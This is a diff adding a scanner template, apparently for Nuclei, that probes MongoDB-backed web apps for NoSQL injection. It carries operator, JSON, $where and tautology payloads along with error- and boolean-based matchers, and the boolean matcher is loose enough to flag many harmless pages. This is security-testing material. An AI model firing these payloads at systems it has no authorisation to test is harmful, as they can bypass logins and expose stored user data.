@@ -1,0 +1,77 @@
+id: nosqli-error-based
+
+info:
+  name: NoSQL Injection - Error/Boolean Based
+  author: erebos
+  severity: critical
+  description: |
+    Tests for NoSQL injection in MongoDB-backed applications by injecting
+    operators ($ne, $gt, $regex, $where) into query parameters.
+    Detects both error-based responses and boolean-based data leakage.
+  reference:
+    - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection
+    - https://book.hacktricks.xyz/pentesting-web/nosql-injection
+  metadata:
+    max-request: 12
+  tags: nosql,nosqli,mongodb,injection,dast
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method != "OPTIONS"'
+
+    payloads:
+      injection:
+        # MongoDB operator injection (query params)
+        - "[$ne]=1"
+        - "[$gt]="
+        - "[$regex]=.*"
+        - "[$exists]=true"
+        # JSON body NoSQL operators
+        - '{"$ne": null}'
+        - '{"$gt": ""}'
+        - '{"$regex": ".*"}'
+        # JavaScript injection ($where)
+        - "1; return true"
+        - "'; return '' == '"
+        # Tautology payloads
+        - "admin' || '1'=='1"
+        - "' || 1==1//"
+
+    fuzzing:
+      - part: request
+        type: replace
+        mode: single
+        fuzz:
+          - "{{injection}}"
+
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      # Error-based detection: MongoDB/Mongoose error messages in response
+      - type: regex
+        name: mongodb-error
+        regex:
+          - "MongoError"
+          - "MongoDB"
+          - "mongo\\.driver"
+          - "\\$where"
+          - "Mongo\\.Error"
+          - "BSONTypeError"
+          - "Cast to ObjectId failed"
+          - "CastError"
+          - "mongoose\\.CastError"
+          - "Unexpected token \\$"
+          - "SyntaxError.*\\$"
+          - "Cannot use .*\\$"
+        condition: or
+
+      # Boolean-based: response differs significantly when injecting $ne=1
+      # (returns data that wouldn't normally appear)
+      - type: dsl
+        name: boolean-nosqli
+        dsl:
+          - "len(body) > 0 && status_code == 200"
+          - "contains(body, '<td>') || contains(body, '<tr>') || contains(body, 'user') || contains(body, 'email') || contains(body, 'name')"
+        condition: and
